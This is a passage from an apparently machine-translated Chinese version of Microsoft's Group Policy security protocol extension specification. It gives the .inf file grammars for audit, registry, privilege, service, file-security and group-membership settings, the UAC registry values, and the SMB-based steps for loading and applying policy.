v5密钥分发中心(KDC)是否必须根据用户帐户的用户权限策略验证每个会话票证请求。对每个会话票证请求进行验证是可选的，因为额外的步骤需要时间，并且会降低网络对服务的访问速度。默认值已启用。非零值表示策略已启用；否则，将禁用策略。 2.2.3 事件日志策略 事件日志策略有三种类型：\n§ 系统日志\n§ 安全日志\n§ 应用程序日志\n它们各自的ABNF必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"System Log\" / \"Security Log\" / \"Application Log\" Settings = Setting / Setting Settings Setting = Key Wsp \"=\" Wsp Value LineBreak Key = \"MaximumLogSize\" / \"AuditLogRetentionPeriod\" / \"RetentionDays\" / \"RestrictGuestAccess\" Value = 1*8DIGIT下表提供了对每个有效键值的解释。\n注所有数值都是十进制的，除非另有明确规定，或者前面有0x。\nSetting key Explanation MaximumLogSize 日志大小（以千字节为单位）必须小于或等于此值。该值必须介于64和4194240之间。 AuditLogRetentionPeriod 指定要应用于特定日志的保留期类型。保留方法必须是下列方法之一：§ 值“0”指示根据需要覆盖事件。§ 值“1”指示覆盖由RetentionDays项指定的事件。§ 值“2”表示从不覆盖事件（手动清除日志）。任何其他值都无效。 RetentionDays 系统、安全和应用程序日志事件在被新事件覆盖之前必须保留的天数。仅当选项AuditLogRetentionPeriod=1时有效。该值必须介于1和365之间。 RestrictGuestAccess 指示具有来宾特权的用户是否可以访问系统、安全和应用程序日志的标志。\u003c3\u003e§ 值“0”表示来宾对系统、安全和应用程序日志的访问不受限制。§ 非零值表示来宾对系统、安全和应用程序日志的访问受到限制。 2.2.4 事件审核策略 本节定义使管理员能够强制审核帐户登录事件的设置。此类别中条目的语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Event Audit\" Settings = Setting / Setting Settings Setting = Key Wsp \"=\" Wsp Value Linebreak Key = \"AuditSystemEvents\" / \"AuditLogonEvents\" / \"AuditPrivilegeUse\" / \"AuditPolicyChange\" / \"AuditAccountManage\" / \"AuditProcessTracking\" / \"AuditDSAccess\" / \"AuditObjectAccess\" / \"AuditAccountLogon\" Value = 1*DIGIT下表提供了[MS-LSAD]第2.2.4.20节中指定的有效密钥的解释。\n注所有数值都是十进制的，除非另有明确规定，或者前面有0x。\nSetting key Explanation AuditAccountManage 指示操作系统是否必须审核计算机上帐户管理的每个事件的标志。 AuditDSAccess 一个安全设置，用于确定操作系统是否必须审核用户尝试访问指定了自己的系统访问控制列表(SACL)的Active Directory对象的每个实例，如果访问请求的类型（如写、读或修改）和发出请求的帐户与SACL中的设置匹配。管理员可以指定只审核成功、只审核失败、成功和失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。如果启用成功审核，则每当任何用户成功访问指定了匹配SACL的Active Directory对象时，都必须记录审核条目。如果启用了失败审核，则每当任何用户尝试访问指定了匹配SACL的Active Directory对象失败时，都必须记录审核条目。 AuditAccountLogon 一个安全设置，确定此计算机每次验证帐户凭据时操作系统是否必须进行审核。每当计算机验证其本地帐户之一的凭据时，就会生成帐户登录事件。凭据验证可以支持本地登录，或者对于域控制器(DC)上的Active Directory域帐户，可以支持登录到另一台计算机。本地帐户的审核事件必须记录在计算机的本地安全日志中。帐户注销不会生成可审核的事件。如果定义了此策略设置，管理员可以指定只审核成功、只审核失败、既审核成功也审核失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。§ AuditLogonEvents 一个安全设置，用于确定操作系统是否必须审核用户尝试登录或注销此计算机的每个实例。每当已登录用户帐户的登录会话终止时，都会生成注销事件。如果定义了此策略设置，管理员可以指定只审核成功、只审核失败、既审核成功也审核失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。§ AuditObjectAccess 一个安全设置，用于确定操作系统是否必须审核用户尝试访问指定了自己的SACL的非Active Directory对象的每个实例，如果访问请求的类型（如写、读或修改）和发出请求的帐户与SACL中的设置匹配。管理员可以指定只审核成功、只审核失败、成功和失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。如果启用成功审核，则每当任何用户成功访问指定了匹配SACL的非Active Directory对象时，都必须记录审核条目。如果启用了失败审核，则每当任何用户尝试访问指定了匹配SACL的非Active Directory对象失败时，都必须记录审核条目。§ AuditPolicyChange 一个安全设置，用于确定操作系统是否必须审核用户尝试更改用户权限分配策略、审核策略、帐户策略或信任策略的每个实例。管理员可以指定只审核成功、只审核失败、成功和失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。如果启用成功审核，则当尝试对用户权限分配策略、审核策略或信任策略的更改成功时，必须记录审核条目。如果启用了失败审核，则当未被授权更改所请求的策略的帐户试图更改用户权限分配策略、审核策略或信任策略时，可能会记录审核条目。\u003c4\u003e§ AuditPrivilegeUse 一个安全设置，用于确定操作系统是否必须审核用户尝试行使用户权限的每个实例。如果定义了此策略设置，管理员可以指定只审核成功、只审核失败、既审核成功也审核失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。如果启用成功审核，则每次成功行使用户权限时都必须记录审核条目。如果启用了失败审核，则每次执行用户权限失败时，都必须记录审核条目，因为用户帐户没有分配给用户权限。§ AuditProcessTracking 一个安全设置，用于确定操作系统是否必须审核与进程相关的事件，如进程创建、进程终止、处理重复和间接对象访问。如果定义了此策略设置，管理员可以指定只审核成功、只审核失败、既审核成功也审核失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。如果启用了成功审核，则每次操作系统执行这些与进程相关的活动之一时，都必须记录一个审核条目。如果启用了失败审核，则每次操作系统未能执行这些与进程相关的活动之一时，都可能会记录一个审核条目。\u003c5\u003e§ AuditSystemEvents 确定操作系统是否必须审核下列任何事件的安全设置：§ 试图更改系统时间。§ 尝试启动或关闭安全系统。§ 尝试加载可扩展身份验证组件。§ 由于审计系统故障而造成的被审计事件的损失。§ 安全日志大小超过可配置的警告阈值级别。如果定义了此策略设置，管理员可以指定只审核成功、只审核失败、既审核成功也审核失败，或者完全不审核这些事件（即既不审核成功也不审核失败）。如果启用了成功审核，则每次操作系统成功执行这些活动之一时，都必须记录一个审核条目。如果启用了失败审核，则每次操作系统尝试执行其中一个活动但失败时，都必须记录一个审核条目。§ 下表提供了有效值的摘要。有关有效值的更多细节，请参见[MS-LSAD]第2.2.4.4节。\n设定值 解释 0 指示此设置被设置为无。 1 指示此设置设置为仅成功审核。 2 指示此设置仅设置为失败审核。 3 指示此设置被设置为成功审核和失败审核。 4 指示此设置被设置为无。 2.2.5 注册表值 本节定义使管理员能够设置注册表项的设置。此类别中条目的语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Registry Values\" Settings = Setting / Setting Settings Setting = RegistryValueName \"=\" RegistryValueType \",\" RegistryValue RegistryValueType = 1*DIGIT RegistryValueName = KeyName / DQUOTE KeyName DQUOTE KeyName = Key / KeyName \"\\\" Key Key = 1*IdCharacter IdCharacter = %x0020-0021 / %x0023-005B / %x005D-007E RegistryValue = String / QuotedString下表为列出的每个参数提供了解释，并指定了有效值集。\n注所有数值都是十进制的，除非另有明确规定或前面有0x。\nSetting key Explanation RegistryValueName 必须是要设置的注册表值的完全限定名（如[MS-RRP]第3.1.1.1.1节所规定）。 RegistryValueType 注册表值的数据类型必须是下列值之一。（有关值类型的更多细节，请参见[MS-RRP]第3.1.1.5节。）§ 值“1”：指示注册表值的数据类型为String。§ 值“2”：指示注册表值的数据类型为展开字符串。§ 值“3”：表示注册表值的数据类型为二进制。§ 值“4”：表示注册表值的数据类型为DWORD。§ 值“7”：指示注册表值的数据类型是multi_sz。虽然存在其他注册表类型，但此协议不支持它们。 RegistryValue 要配置的值。此值的数据类型必须与RegistryValueType字段中指定的类型匹配。 2.2.6 特权权利 本节定义使管理员能够控制哪些帐户具有哪些特权的设置。此类别中条目的语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Privilege Rights\" Settings = Setting / Setting Settings Setting = RightName Wsp \"=\" Wsp SidList LineBreak SidList = SidEnt / SidEnt Wsp \",\" Wsp SidList RightName = \"SeNetworkLogonRight\" / \"SeTcbPrivilege\" / \"SeMachineAccountPrivilege\" / \"SeIncreaseQuotaPrivilege\" / \"SeRemoteInteractiveLogonRight\" / \"SeBackupPrivilege\" / \"SeChangeNotifyPrivilege\" / \"SeCreatePagefilePrivilege\" / \"SeSystemtimePrivilege\" / \"SeCreateTokenPrivilege\" / \"SeCreateGlobalPrivilege\" / \"SeCreatePermanentPrivilege\" / \"SeDebugPrivilege\" / \"SeDenyNetworkLogonRight\" / \"SeDenyBatchLogonRight\" / \"SeDenyServiceLogonRight\" / \"SeDenyInteractiveLogonRight\" / \"SeDenyRemoteInteractiveLogonRight\" / \"SeEnableDelegationPrivilege\" / \"SeRemoteShutdownPrivilege\" / \"SeAuditPrivilege\" / \"SeImpersonatePrivilege\" / \"SeIncreaseBasePriorityPrivilege\" / \"SeLoadDriverPrivilege\" / \"SeLockMemoryPrivilege\" / \"SeBatchLogonRight\" / \"SeServiceLogonRight\" / \"SeInteractiveLogonRight\" / \"SeSecurityPrivilege\" / \"SeSystemEnvironmentPrivilege\" / \"SeManageVolumePrivilege\" / \"SeProfileSingleProcessPrivilege\" / \"SeSystemProfilePrivilege\" / \"SeUndockPrivilege\" / \"SeAssignPrimaryTokenPrivilege\" / \"SeRestorePrivilege\" / \"SeShutdownPrivilege\" / \"SeSyncAgentPrivilege\" / \"SeTakeOwnershipPrivilege\" / \"SeTrustedCredManAccessPrivilege\" / \"SeTimeZonePrivilege\" / \"SeCreateSymbolicLinkPrivilege\" / \"SeIncreaseWorkingSetPrivilege\" / \"SeRelabelPrivilege\" SidEnt = %d42 SID / PRINCIPALNAMESTRING ; SID is defined in MS-DTYP section 2.4.2.1 PRINCIPALNAMESTRING = 1*20(ALPHANUM / %d32-33 / %d35-41 / %d45 / %d64 / %d94-96 / %d123 / %d125 / %d126)有关每个权限设置的信息，请参见[MSDN-PRIVS]。\n前面语法中的SID元素是帐户或组的安全标识符的字符串表示，必须符合[MS-DTYP]节2.4.2.1中指定的语法。\n2.2.7 注册表项 本节定义使管理员能够指定如何保护客户端上的注册表项的设置。此类别中条目的ABNF语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Registry Keys\" Settings = Setting / Setting Settings Setting = RegistryKeyName \",\" PermPropagationMode \",\" AclString LineBreak RegistryKeyName = KeyPath / DQUOTE KeyPath DQUOTE KeyPath = Key / KeyPath \"\\\" Key Key = 1*IdCharacter IdCharacter = %x0020-0021 / %x0023-005B / %x005D-007E PermPropagationMode = DIGIT AclString = SDDL/ DQUOTE SDDL DQUOTE上面SDDL元素的ABNF规范可以在[MS-DTYP]第2.5.1.1节中找到。\n下表提供了列出的每个参数的解释。\n注所有数值都是十进制的，除非另有明确规定，或者前面有0x。\n设置键 解释 RegistryKeyName 必须保护的注册表项的全名。它必须是要设置的注册表值的完全限定名（如[MS-RRP]第3.1.1.1.1节所规定）。 permpropagationmode 控制权限是否传播以及如何传播。它必须是下列值之一：§ 值“0”：必须将可继承的权限传播到所有子键。§ 值“1”：必须用可继承的权限替换所有子键上的现有权限。§ 值“2”：不允许替换对此密钥的权限。 ACLString 必须应用于注册表项的安全描述符。安全描述符必须符合[MS-DTYP]节2.5.1.1中指定的语法。 2.2.8 服务常规设置 本节定义启用在客户端计算机上运行的服务上的启动类型和自主访问控制列表配置的设置。此类别中条目的语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Service General Setting\" Settings = Setting / Setting Settings Setting = ServiceName \",\" StartupMode \",\" AclString LineBreak ServiceName = 1*256IdCharacter / DQUOTE 1*256IdCharacter DQUOTE IdCharacter = ALPHANUM/ %d33 / %d35-43 / %d45-46 / %d58-64 / %d91 / %d93-96 / %d123-126 StartupMode = DIGIT AclString = SDDL / DQUOTE SDDL DQUOTE上面SDDL元素的ABNF规范可以在[MS-DTYP]第2.5.1.1节中找到。\n下表解释了ServiceName、StartupMode和AclString字段。\n注所有数值都是十进制的，除非另有明确规定，或者前面有0x。\nSetting key Explanation ServiceName 一个字符串，表示必须配置的服务的逻辑服务名。它必须是ABNF中指定的1到256个字符的字母数字字符串。 StartupMode 进程的启动模式，必须是以下值之一（以下解释是摘要；有关详细信息，请参阅[MS-SCMR]节2.2.15):§ 值“2”：表示启动模式为自动。§ 值“3”：表示启动模式为手动。§ 值“4”：表示禁用启动模式。 AclString 一个安全描述符，如果存在，则必须应用于服务。安全描述符必须符合[MS-DTYP]节2.5.1.1中指定的语法。 2.2.9 文件安全 本节定义如何使管理员能够指定如何保护客户端上的文件和目录。此类别中条目的ABNF语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"File Security\" Settings = Setting / Setting Settings Setting = FileOrDirectoryPath \",\" PermPropagationMode \",\" AclString LineBreak FileOrDirectoryPath = String / QuotedString PermPropagationMode = DIGIT AclString = SDDL / DQUOTE SDDL DQUOTE 上面SDDL元素的ABNF规范可以在[MS-DTYP]第2.5.1.1节中找到。\n下表解释了列出的每个设置。\n注所有数值都是十进制的，除非另有明确规定，或者前面有0x。\nSetting key Explanation FileOrDirectoryPath 必须保护的文件或目录的路径。它必须是字符串或ABNF中指定的双引号字符之间的字符串。 PermPropagationMode 控制权限是否传播以及如何传播。它必须是下列值之一：§ 值“0”：必须将可继承权限传播到所有子文件夹和文件。§ 值“1”：必须用可继承的权限替换所有子文件夹和文件上的现有权限。§ 值“2”：不允许替换此文件或文件夹上的权限。 AclString 必须应用于文件或目录的安全描述符。安全描述符必须符合[MS-DTYP]节2.5.1.1中指定的语法。 2.2.10 组成员资格 本节定义使管理员能够控制各种组的成员资格的设置。此类别中条目的ABNF语法必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Group Membership\" Settings = Setting / Setting Settings Setting = Key Wsp \"=\" Wsp ValueList LineBreak Key = GroupNameMembers / GroupNameMemberof GroupNameMembers = (GroupName / (%d42 SID)) \"__Members\" GroupNameMemberof = (GroupName / (%d42 SID)) \"__Memberof\" GroupName = GROUPNAMESTRING ValueList = Value / Value Wsp \",\" Wsp ValueList Value = %d42 SID / GROUPNAMESTRING GROUPNAMESTRING = 1*256(ALPHANUM / %d32-33 / %d35-41 / %d45 / %d64 / %d94-96 / %d123 / %d125 / %d126)前面语法中的SID元素在[MS-DTYP]第2.4.2.1节中有其ABNF规范。\n请注意，在实际的安全策略中，前面的“GroupName”设置必须替换为必须配置其他组中成员或成员资格的组的实际名称。有关更多信息，请参见4.3节中的示例。\n下表解释了列出的每个设置。\nSetting key Explanation GroupNameMembers 表示已向其追加字符串“__members”的组名的字符串。指定组的成员资格将设置为ValueList。字符串必须是这里指定的ABNF中定义的字母数字字符串。 GroupNameMemberof 表示已向其追加字符串“__memberof”的组名的字符串。指定的组将成为ValueList中每个组的成员。字符串必须是这里指定的ABNF中定义的字母数字字符串。 Value 对于GroupNameMembers，指该组必须包含的用户和组的SID或名称。对于GroupNameMemberof，表示该组必须是其成员的SID或组名。每个值必须符合[MS-DTYP]节2.4.2.1中指定的SID语法，或者符合此处指定的GROUPNAMESTRING ABNF语法。 2.2.11 用户帐户控制 本节定义使管理员能够配置用户帐户控制功能的行为的设置。有关如何定义\u003c6\u003e中列出的设置的详细信息，请参阅第2.2.5和2.2.7节。\n2.2.11.1 过滤管理员凭证 FilterAdministratorToken\nKey: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “FilterAdministratorToken”\nType: REG_DWORD\nData：这必须是下表中的值。\nValue Meaning 0x00000000 只有内置的管理员帐户（RID 500）应该被置于完全令牌模式。\u003c7\u003e 0x00000001 只有内置的管理员帐户(RID500)被置于管理审批模式。执行管理任务时需要批准。 2.2.11.2 同意提示行为管理 ConsentPromptBehaviorAdmin\nKey: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “ConsentPromptBehaviorAdmin”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 此选项允许同意管理员在没有同意或凭据的情况下执行需要提升的操作。 0x00000001 当操作需要提升权限时，此选项提示同意管理员输入其用户名和密码（或其他有效管理员）。此操作发生在安全桌面上。 0x00000002 此选项提示管理员在管理审批模式下选择“允许”或“拒绝”需要提升权限的操作。如果同意管理员选择许可，则操作将以最高的可用权限继续进行。“提示同意”消除了要求用户输入姓名和密码以执行特权任务的不便。此操作发生在安全桌面上。 0x00000003 当操作需要提升权限时，此选项提示同意管理员输入他或她的用户名和密码（或其他有效管理员的用户名和密码）。 0x00000004 这会提示管理员在管理审批模式下选择“允许”或“拒绝”需要提升权限的操作。如果同意管理员选择许可，则操作将以最高的可用权限继续进行。“提示同意”消除了要求用户输入姓名和密码以执行特权任务的不便。 0x00000005 此选项是默认值。它用于提示管理员在管理审批模式下为需要提升任何非Windows二进制文件权限的操作选择“允许”或“拒绝”。如果同意管理员选择许可，则操作将以最高的可用权限继续进行。此操作将在安全桌面上进行。\u003c8\u003e 2.2.11.3 同意提示行为用户 Key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “ConsentPromptBehaviorUser”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 应设置此选项，以确保任何需要提升权限的操作都将以标准用户身份失败。 0x00000001 应设置此选项，以确保需要执行需要提升权限的操作的标准用户将被提示输入管理用户名和密码。如果用户输入有效凭据，则操作将以适用的权限继续。 2.2.11.4 启用安装程序检测 Key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “EnableInstallerDetection”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 此选项应用于禁用对需要提升才能安装的安装包的自动检测。 0x00000001 此选项应用于启发式地检测需要提升权限才能安装的应用程序。 2.2.11.5 验证管理代码签名 Key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “ValidateAdminCodeSignatures”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 不要在需要提升权限的交互式应用程序上强制加密签名。 0x00000001 在任何请求提升权限的交互式应用程序上强制加密签名。 2.2.11.6 启用LUA Key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “EnableLUA”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 禁用此策略将禁用“管理员审批模式下的管理员”用户类型。 0x00000001 此策略启用“管理员审批模式下的管理员”用户类型，同时还启用所有其他用户帐户控制(UAC)策略。 2.2.11.7 提示安全桌面 Key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “PromptOnSecureDesktop”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 禁用此策略将禁用安全桌面提示。所有凭据或同意提示都将出现在交互式用户的桌面上。 0x00000001 此策略将强制所有UAC提示发生在用户的安全桌面上。 2.2.11.8 支持虚拟化 Key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nValue: “EnableVirtualization”\nType: REG_DWORD\nData: This MUST be a value in the following table.\nValue Meaning 0x00000000 禁用交互式进程的数据重定向。 0x00000001 此策略允许将传统应用程序文件和注册表的写入重定向到用户可写的数据位置，这些写入通常作为标准用户会失败。此设置缓解了应用程序历史上以管理员身份运行并将运行时应用程序数据写回只能由管理员写入的位置的问题。 3. 协议细节 3.1 管理端插件详情 管理端插件参与安全策略的创作和分配步骤，如第2节所述。安全策略必须使用.inf格式存储为文本文件，如第2.2节所述。安全策略必须存储在通过使用SMB可通过网络访问的位置（例如网络共享）中。\n3.1.1 抽象数据模型 管理端插件不维护任何状态。如第2.2节所述，它将所有设置加载到内存中的\u003cname of setting，value of setting\u003epair中。\n当使用管理UI时，管理端插件用于与组策略框架交互，如[MS-GPOL]中所指定的那样。它根据抽象数据模型确定所需安全策略的物理位置，根据需要创建新策略或打开现有策略，并将其显示给管理员。管理员修改策略后，更改会在所需位置传回策略。\n3.1.2 定时器 一个都没有。\n3.1.3 初始化 当管理端插件启动时，它必须从[MS-GPOL]第2.2.4节中指定的组策略：核心协议中获得一个限定范围的GPO路径，并执行第3.1.5.1节Load Policy中描述的处理。\n3.1.4 高层触发事件 较高层触发事件发生在以下情况：\n§ 管理员加载组策略：安全协议扩展GPO.inf文件。参见3.1.5.1节，加载策略。\n§ 管理员更改任何组策略：安全协议扩展设置值。请参见第3.1.5.2节，更新策略。\n§ 管理员删除任何组策略：安全协议扩展设置值。参见第3.1.5.3节，删除设置值。\n3.1.5 消息处理事件和排序规则 管理端插件从远程存储位置读取特定于扩展的数据，如第3.2.5节步骤1-3所述。管理端插件将该信息传递给特定于实现的工具，该工具提供图形用户界面以向管理员显示当前设置。\n如果管理员对现有配置做了任何更改，管理端插件会将特定于扩展的配置数据写入远程存储位置，如3.1.5.2Update Policy部分所述。\n在每次创建、修改或删除影响SYSVOL上的gpttmpl.inf文件之后，管理工具必须调用组策略扩展更新任务([MS-GPOL]节3.3.4.4)。\n3.1.5.1 加载策略 当管理员启动管理端插件时，将发生加载策略事件。当管理端插件启动时，它必须从[MS-GPOL]第2.2.4节中指定的组策略：核心协议中获得一个限定范围的GPO路径。插件必须尝试从“\\machine\\microsoft\\Windows NT\\secedit\\”中检索任何现有的gpttmpl.inf文件，其中“”是GPO路径。必须执行文件读取，如第3.2.5节步骤1-3所述。如果读取文件的尝试失败，则必须记录错误并停止处理。\n3.1.5.2 更新策略 若要使用管理工具插件更新GPO中的策略设置，必须使用更新策略消息更新组策略服务器上该GPO的状态。这必须通过以下消息序列完成：\n\\1. 从客户端打开到服务器的SMB文件：\n插件必须从组策略：核心协议中获得GPO路径，如[MS-GPOL]第2.2.4节中指定的，并尝试将gpttmpl.inf文件写入以下位置：“\\machine\\microsoft\\Windows NT\\secedit\\”，其中“”是GPO路径。\n打开的SMB文件必须请求写权限，如果该文件不存在，则请求创建该文件。\n如果打开的请求返回失败状态，则必须终止组策略：安全协议扩展序列。\n\\2. SMB文件写入顺序：\n管理外接程序必须执行一系列SMB文件写入操作，才能用新设置覆盖打开的文件的内容。这些写操作必须继续进行，直到整个文件被写入或遇到错误为止。\n如果遇到错误，则必须终止协议序列。\n\\3. 文件关闭：\n然后该工具必须发出SMB文件关闭操作。\n\\4. 管理工具调用组策略扩展更新任务([MS-GPOL]节3.3.4.4)。\n文件名和路径应视为不区分大小写。如果写入失败，管理端插件必须向用户显示操作失败。\n3.1.5.3 删除设置值 当管理员移除设置值时，将发生删除设置值事件。当删除设置值时，将从内存中删除该设置，并执行3.1.5.2节更新策略中描述的处理。\n3.1.6 定时器事件 无\n3.1.7 其他本地活动 无\n3.2 客户端插件详细信息 客户端插件与组策略框架交互，如[MS-GPOL]第3.2节所述。此插件必须接收安全策略，并根据管理员的指示应用该策略。\n3.2.1 抽象数据模型 本节定义了一个可能的数据组织的概念模型，实现维护该模型以参与该协议。提供所描述的组织是为了解释协议如何行为。只要实现的外部行为与本文档中描述的一致，本文档并没有强制要求实现遵守此模型。\n该协议设置在其他协议文档中定义的共享抽象数据模型变量。每个共享变量的规范定义在相应的文档中给出，如下所示：\n此协议设置从[MS-LSAD]共享的以下抽象数据变量：\n§ MaxServiceTicketAge ([MS-LSAD] section 3.1.1.1)\n§ MaxTicketAge ([MS-LSAD] section 3.1.1.1)\n§ MaxRenewAge ([MS-LSAD] section 3.1.1.1)\n§ MaxClockSkew ([MS-LSAD] section 3.1.1.1)\n§ AuthenticationOptions ([MS-LSAD] section 3.1.1.1)\nThis protocol sets the following abstract data variables shared from [MS-EVEN]:\n§ MaxSize ([MS-EVEN] section 3.1.1.2)\n§ Retention ([MS-EVEN] section 3.1.1.2)\n§ RestrictGuestAccess ([MS-EVEN] section 3.1.1.2)\n3.2.2 定时器 无\n3.2.3 初始化 当Group Policy framework使用一个或多个适用GPO的列表调用时，客户端插件必须执行以下操作：定位这些GPO中的所有物理安全策略，将策略复制到本地计算机，读取策略，并按照第3.2.5节中的规定应用它们。\n查找物理安全策略文件必须使用组策略：核心协议（如[MS-GPOL]第3.2.5.1节所述）和LDAP搜索协议（如[RFC2251]第4.5节所述）。应该使用[MS-SMB2]中指定的服务器消息块(SMB)版本2和3协议中的标准复制和读取函数来复制和读取策略文件\u003c9\u003e。\n3.2.4 高层触发事件 客户端插件实现一个更高层的触发事件：进程组策略。\n3.2.4.1 进程组策略 客户端插件实现了[MS-GPOL]第3.2.4.1节中指定的进程组策略抽象事件接口。客户端插件不使用已删除的GPO列表、SessionFlags或UserToken参数。当事件被触发时，客户端插件必须采取3.2.5节中描述的操作。\n3.2.5 消息处理事件和排序规则 当需要处理适用的GPO时，客户端插件GPO必须由组策略框架触发。当发生这样的事件时，客户端插件将采取适当的操作。\n当触发时，客户端插件需要一个适用的GPO列表。然后，它必须遍历此列表，并为每个GPO查找和检索包含的安全策略。\n检索到所有安全策略后，必须打开每个策略，并提取和应用包含的安全策略设置。\n当策略应用程序步骤完成时，必须按照[MS-GPOL]中的规定，向组策略框架返回适当的错误代码，以指示操作的成功或失败。\n组策略：核心协议必须为其标识为包含组策略：安全协议扩展协议设置的每个GPO调用客户端插件。对于每一个GPO，必须从组策略：核心协议服务器复制一个格式（如2.2节所述）的文件。如果任何文件无法读取，客户端插件必须忽略故障，并继续为其他GPO复制文件。\n组策略：核心协议客户端必须按照[MS-GPOL]第3.2.5.1节的规定，确定必须对其执行本协议的GPO列表。\n对于每个GPO，客户端插件必须执行以下操作：\n\\1. 在\\machine\\microsoft\\windows nt\\secedit\\gpttmpl.inf指定的文件上执行SMB文件打开（其中是GPO中的GPO路径）。如果在打开文件时遇到错误，则必须向客户端计算机上的组策略系统（如[MS-GPOL]节2.2.7中所述）指示错误，并且必须停止处理。\n\\2. 执行一系列SMB文件读取，以读取打开的文件的全部内容，直到整个文件被读取或发生读取错误。如果在读取文件时遇到错误，则必须向客户端计算机上的组策略系统（如[MS-GPOL]中所指定）指示错误，并且必须中止处理。\n\\3. 执行SMB文件关闭以关闭该文件。\n当按照前面的步骤使用SMB打开或读取文件时，客户端插件应该按照[MS-SMB]节2.2.2.4或[MS-SMB2]中的规定处理SMB协议返回的错误代码。\n客户端插件必须按照2.2节中指定的格式解析文件。如果文件不符合该格式，则必须忽略整个配置操作。如果文件符合该格式，则必须将设置应用于系统上相应的安全参数。\n在应用安全策略时，几个组策略：安全协议扩展设置名对应于抽象数据模型共享变量，其他文档中提供了该变量的规范定义（参见第3.2.1节）下表中提供了设置名称和相应的抽象数据模型共享变量。对于从GPO.inf文件读取的每个此类设置，客户端插件必须将表右侧列中的ADM变量的值设置为左侧列中设置的值。\n3.2.5.1 密码策略 通过执行以下操作设置密码策略：\n\\1. 如果settings键的设置值超出2.2.1.1节中表中相应解释列中指定的有效值范围，则客户端应退出密码策略处理并记录错误。\n\\2. 执行与本地调用SamrQueryInformationDomain([MS-SAMR]节3.1.5.5.2)一致的外部行为，以获得现有的域密码信息。\n§ 必须将DomainHandle设置为通过执行与本地调用SamrOpenDomain一致的外部行为打开的域句柄([MS-SAMR]节3.1.5.1.5)，以获得当前计算机的域句柄。\n§ 必须将DomainInformationClass设置为DomainPasswordInformation。\n§ PSAMPR_DOMAIN_INFO_BUFFER必须是指向PSAMPR_DOMAIN_INFO_BUFFER的指针，该指针包含足够包含DOMAIN_PASSWORD_INFORMATION结构的已分配内存。\n\\3. 调用SamrSetInformationDomain([MS-SAMR]节3.1.5.6.1)。\n§ 必须将DomainHandle设置为通过执行与本地调用SamrOpenDomain一致的外部行为打开的域句柄([MS-SAMR]节3.1.5.1.5)，以获得当前计算机的域句柄。\n§ 必须将DomainInformationClass设置为DomainPasswordInformation。\n§ DomainInformation必须是包含DOMAIN_PASSWORD_INFORMATION结构的PSAMPR_DOMAIN_INFO_BUFFER。客户端插件必须根据以下规则中的映射，将GPO inf文件中指定的每个密码策略值设置为DOMAIN_PASSWORD_INFORMATION结构成员。\n对于MinimumPasswordLength、PasswordComputition、ClearTextPassword和PasswordHistorySize设置，客户端管理单元必须将GPO inf文件中的设置名称映射到下表左侧列中的值之一，并将相应右侧列中标识的DOMAIN_PASSWORD_INFORMATION结构成员的值设置为该设置值。对于PasswordComplements和ClearTextPassword设置，如果GPO inf文件中的设置值为“true”，则客户端插件必须将右侧列中标识的DOMAIN_PASSWORD_INFORMATION结构成员的值设置为右侧列中提供的值。\nGroup Policy: Security Protocol Extension DOMAIN_PASSWORD_INFORMATION 的成员 MinimumPasswordLength MinPasswordLength PasswordComplexity PasswordProperties bit DOMAIN_PASSWORD_COMPLEX (0x00000001) ClearTextPassword PasswordProperties bit DOMAIN_PASSWORD_STORE_CLEARTEXT (0x00000010) PasswordHistorySize PasswordHistoryLength 对于MaximumPasswordAge设置，客户端管理单元必须将GPO inf文件中的设置值映射到下表左侧列中的值之一，并将DOMAIN_PASSWORD_INFORMATION结构MaxPasswordAge成员设置为下表相应右侧列中指定的转换所产生的值。\nMaximumPasswordAge value DOMAIN_PASSWORD_INFORMATION MaxPasswordAge member value -1 0x8000000000000000 X (any value 1 to 999) -1X24*3600 * 10000000 对于MinimumPasswordAge设置，客户端管理单元必须将DOMAIN_PASSWORD_INFORMATION结构MinPasswordAge成员设置为下表右侧列中指定的转换所产生的值。\nMinimumPasswordAge value DOMAIN_PASSWORD_INFORMATION MinPasswordAge member value X (any value 0 to 999) -1X24*3600 * 10000000 3.2.5.2 帐户锁定策略 通过执行以下操作设置帐户锁定策略：\n如果GPO inf文件中的密钥名称是“lockoutbadcount”、“resetlockoutcount”或“lockoutduration”：\n\\1. 执行与本地调用SamrQueryInformationDomain([MS-SAMR]节3.1.5.5.2)一致的外部行为，以获得现有的域帐户锁定信息。\n§ 